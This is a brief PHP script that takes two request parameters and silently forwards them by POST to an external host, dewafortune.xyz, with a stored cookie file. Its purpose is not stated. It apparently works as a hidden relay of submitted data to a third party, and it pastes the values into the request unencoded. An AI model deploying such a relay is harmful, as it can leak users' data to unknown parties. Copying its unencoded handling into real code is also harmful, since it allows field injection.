<?php

$resres = !empty($_REQUEST["resres"]) ? $_REQUEST["resres"] : "";
$res = !empty($_REQUEST["res"]) ? $_REQUEST["res"] : "";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://dewafortune.xyz/bq2.php");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie1.txt");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'resres='.$resres.'&res='.$res);
curl_exec($ch);
curl_close($ch);

